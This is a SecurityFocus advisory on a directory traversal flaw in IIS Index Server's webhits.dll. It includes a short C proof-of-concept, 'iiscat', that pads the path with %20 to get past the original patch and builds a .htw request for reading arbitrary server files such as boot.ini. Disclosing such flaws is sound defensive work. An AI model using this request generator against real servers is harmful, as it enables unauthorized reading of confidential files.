source: http://www.securityfocus.com/bid/950/info

Index Server 2.0 is a utility included in the NT 4.0 Option Pack. The functionality provided by Index Service has been built into Windows 2000 as Indexing Services.

When combined with IIS, Index Server and Indexing Services include the ability to view web search results in their original context. It will generate an html page showing the query terms in a short excerpt of the surrounding text for each page returned, along with a link to that page. This is known as "Hit Highlighting". To do this, it supports the .htw filetype which is handled by the webhits.dll ISAPI application. This dll will allow the use of the '../' directory traversal string in the selection of a template file. This will allow for remote, unauthenticated viewing of any file on the system whose location is known by the attacker.

The original patch released for this issue still discloses 'include' file types. 'include' files contain various data which assist in the execution of program files.

/* 
   fredrik.widlund@defcom-sec.com 
   
   example: iiscat ../../../../boot.ini
 */

#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  char request[2048], *request_p, *file_read, *file_valid = "/default.htm";
  int file_buf_size = 250;
  
  if (!((argc == 2 && argv[1] && strlen(argv[1]) < 1024) || 
	(argc == 3 && argv[1] && argv[2] && strlen(argv[1]) <= file_buf_size && strlen(argv[2]) < 1024)))
    {
      fprintf(stderr, "usage: iiscat file_to_read [valid_file]\n");
      exit(1);
    }
  
  file_read = argv[1];
  if (argc == 3)
    file_valid = argv[2];

  sprintf(request, "GET %s", file_valid);
  request_p = request + strlen(request);

  file_buf_size -= strlen(file_valid);
  while(file_buf_size)
    {
      strcpy(request_p, "%20");
      request_p += 3;
      file_buf_size--;
    }

  sprintf(request_p, ".htw?CiWebHitsFile=%s&CiRestriction=none&CiHiliteType=Full HTTP/1.0\n\n", file_read);
  puts(request);

  exit(0);
}
